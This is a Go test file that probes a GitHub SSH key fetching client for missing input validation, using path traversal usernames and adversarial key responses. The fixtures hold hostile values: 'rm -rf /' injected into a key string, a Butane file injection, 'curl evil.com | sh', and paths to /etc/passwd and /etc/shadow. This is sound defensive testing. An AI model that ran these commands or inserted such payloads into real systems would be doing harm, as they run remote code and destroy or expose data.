package github

import (
	"context"
	"fmt"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"
)

// TestFetchKeys_UsernamePathTraversal verifies that usernames with path
// traversal characters don't escape the expected URL path.
func TestFetchKeys_UsernamePathTraversal(t *testing.T) {
	var requestedPath string
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		requestedPath = r.URL.Path
		// Return a valid key for any request so we can inspect the path
		_, _ = fmt.Fprintln(w, "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGdllynsgXbmcFXhVJAIAkDbYjqZ2OgHgZJVFmFKtvF7 test@test")
	}))
	defer srv.Close()

	client := &Client{BaseURL: srv.URL, HTTP: srv.Client()}

	tests := []struct {
		name     string
		username string
		wantPath string // expected URL path
	}{
		{"dot-dot-slash", "../etc/passwd", "/../etc/passwd.keys"},
		{"encoded-slash", "user%2F..%2F..", "/user%2F..%2F...keys"},
		{"double-dot", "user/../admin", "/user/../admin.keys"},
		{"query-injection", "user?foo=bar", "/user?foo=bar.keys"},
		{"hash-fragment", "user#fragment", "/user#fragment.keys"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// The URL is constructed directly — these DO result in unexpected paths.
			// This test documents the behavior for awareness.
			_, _ = client.FetchKeys(context.Background(), tt.username)
			t.Logf("username=%q → requested path=%q", tt.username, requestedPath)
		})
	}
}

// TestFetchKeys_MaliciousKeyContent tests that the client handles
// potentially malicious content in the API response.
func TestFetchKeys_MaliciousKeyContent(t *testing.T) {
	tests := []struct {
		name     string
		response string
		wantKeys int
		desc     string
	}{
		{
			name:     "key with embedded newlines",
			response: "ssh-ed25519 AAAA" + strings.Repeat("B", 68) + " user@host",
			wantKeys: 1,
			desc:     "normal key should work",
		},
		{
			name:     "key with null bytes",
			response: "ssh-ed25519 AAAA\x00INJECTED user@host",
			wantKeys: 1,
			desc:     "null bytes pass through without validation",
		},
		{
			name:     "key with YAML injection",
			response: `ssh-ed25519 AAAA" ; rm -rf / #`,
			wantKeys: 1,
			desc:     "YAML special chars in key value",
		},
		{
			name:     "key with Butane injection via multiline",
			response: "ssh-ed25519 AAAA\\nfiles:\\n  - path: /etc/evil",
			wantKeys: 1,
			desc:     "literal backslash-n in key (not actual newline)",
		},
		{
			name:     "extremely long key (100KB)",
			response: "ssh-rsa " + strings.Repeat("A", 100000) + " user@host",
			wantKeys: 1,
			desc:     "oversized key accepted without length limit",
		},
		{
			name:     "not an SSH key at all",
			response: "this is not an ssh key\njust random garbage",
			wantKeys: 2,
			desc:     "non-SSH content returned as keys with no validation",
		},
		{
			name:     "HTML response (wrong content-type)",
			response: "<html><body>Rate limited</body></html>",
			wantKeys: 1,
			desc:     "HTML parsed as single key",
		},
		{
			name:     "key with tab characters",
			response: "ssh-ed25519\tAAAA\tuser@host",
			wantKeys: 1,
			desc:     "tabs treated as whitespace in Fields splitting",
		},
		{
			name:     "key with carriage return",
			response: "ssh-ed25519 AAAA user@host\r\nssh-rsa BBBB user2@host\r\n",
			wantKeys: 2,
			desc:     "Windows-style line endings may leave \\r in keys",
		},
		{
			name:     "many keys (1000)",
			response: strings.Repeat("ssh-ed25519 AAAA user@host\n", 1000),
			wantKeys: 1000,
			desc:     "no limit on number of keys returned",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
				_, _ = fmt.Fprint(w, tt.response)
			}))
			defer srv.Close()

			client := &Client{BaseURL: srv.URL, HTTP: srv.Client()}
			keys, err := client.FetchKeys(context.Background(), "testuser")

			if err != nil {
				t.Logf("[INFO] %s: returned error (safe): %v", tt.desc, err)
				return
			}

			if len(keys) != tt.wantKeys {
				t.Errorf("%s: got %d keys, want %d", tt.desc, len(keys), tt.wantKeys)
			}

			// Log keys for manual inspection of dangerous content
			for i, k := range keys {
				if len(k) > 80 {
					t.Logf("  key[%d] = %q... (len=%d)", i, k[:80], len(k))
				} else {
					t.Logf("  key[%d] = %q", i, k)
				}
			}
		})
	}
}

// TestFetchKeys_WindowsLineEndings verifies \r\n handling.
// GitHub API typically returns \n, but a compromised proxy could inject \r\n.
func TestFetchKeys_WindowsLineEndings(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		// Simulate Windows-style response
		_, _ = fmt.Fprint(w, "ssh-ed25519 AAAA key1\r\nssh-rsa BBBB key2\r\n")
	}))
	defer srv.Close()

	client := &Client{BaseURL: srv.URL, HTTP: srv.Client()}
	keys, err := client.FetchKeys(context.Background(), "testuser")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	// strings.Split on \n leaves \r attached to the key
	for i, k := range keys {
		if strings.ContainsRune(k, '\r') {
			t.Errorf("key[%d] contains \\r (not stripped): %q", i, k)
		}
	}
}

// TestFetchKeys_BodySizeLimit verifies the 1MB limit works.
func TestFetchKeys_BodySizeLimit(t *testing.T) {
	// Server returns >1MB of data
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		// Write 2MB — the client should only read 1MB
		data := "ssh-ed25519 " + strings.Repeat("A", 1024) + " user@host\n"
		for written := 0; written < 2<<20; written += len(data) {
			_, _ = fmt.Fprint(w, data)
		}
	}))
	defer srv.Close()

	client := &Client{BaseURL: srv.URL, HTTP: srv.Client()}
	keys, err := client.FetchKeys(context.Background(), "testuser")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	// Should have data but be truncated at ~1MB
	totalSize := 0
	for _, k := range keys {
		totalSize += len(k)
	}
	if totalSize > 1<<20 {
		t.Errorf("read more than 1MB: %d bytes across %d keys", totalSize, len(keys))
	}
	t.Logf("read %d bytes across %d keys (limit 1MB)", totalSize, len(keys))
}

// TestFetchKeys_TimeoutRespected verifies the 10s timeout.
func TestFetchKeys_TimeoutRespected(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		time.Sleep(200 * time.Millisecond) // Simulate slow server
		_, _ = fmt.Fprintln(w, "ssh-ed25519 AAAA user@host")
	}))
	defer srv.Close()

	// Use a very short timeout
	client := &Client{
		BaseURL: srv.URL,
		HTTP:    &http.Client{Timeout: 50 * time.Millisecond},
	}

	_, err := client.FetchKeys(context.Background(), "testuser")
	if err == nil {
		t.Fatal("expected timeout error, got nil")
	}
	if !strings.Contains(err.Error(), "context deadline exceeded") &&
		!strings.Contains(err.Error(), "Client.Timeout") {
		t.Errorf("expected timeout error, got: %v", err)
	}
}

// TestFetchKeys_NoKeyValidation demonstrates that FetchKeys returns
// arbitrary content without SSH key format validation.
func TestFetchKeys_NoKeyValidation(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		// Return things that are NOT SSH keys
		_, _ = fmt.Fprintln(w, "PRIVATE KEY MATERIAL -----BEGIN RSA PRIVATE KEY-----")
		_, _ = fmt.Fprintln(w, "arbitrary command injection; curl evil.com | sh")
		_, _ = fmt.Fprintln(w, "../../../../../../etc/shadow")
	}))
	defer srv.Close()

	client := &Client{BaseURL: srv.URL, HTTP: srv.Client()}
	keys, err := client.FetchKeys(context.Background(), "testuser")

	// This SHOULD fail but currently returns the garbage as "keys"
	if err != nil {
		t.Logf("good: error returned for invalid keys: %v", err)
		return
	}

	// Document that no validation occurs
	if len(keys) != 3 {
		t.Errorf("got %d keys, want 3 (no validation applied)", len(keys))
	}
	t.Log("WARNING: FetchKeys returns arbitrary content without SSH key format validation")
	t.Log("Downstream validate.SSHPublicKey() must be called before use")
}

// TestFetchKeys_UsernameValidation checks that special characters in
// usernames are handled (or not handled).
func TestFetchKeys_UsernameValidation(t *testing.T) {
	client := &Client{BaseURL: "https://github.com", HTTP: &http.Client{Timeout: 1 * time.Second}}

	tests := []struct {
		name     string
		username string
		wantErr  bool
	}{
		{"empty", "", true},
		{"spaces", "user name", false},                  // NOT rejected!
		{"null byte", "user\x00name", false},            // NOT rejected!
		{"slash", "user/name", false},                   // NOT rejected!
		{"backslash", `user\name`, false},               // NOT rejected!
		{"unicode", "usér", false},                      // NOT rejected!
		{"very long", strings.Repeat("a", 1000), false}, // NOT rejected!
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			_, err := client.FetchKeys(context.Background(), tt.username)
			gotErr := err != nil
			// We only check the empty case returns an error from validation;
			// all others will fail due to network but that's expected.
			if tt.username == "" && !gotErr {
				t.Error("empty username should be rejected")
			}
			if tt.username == "" && gotErr {
				t.Logf("correctly rejected empty username: %v", err)
			}
		})
	}
}
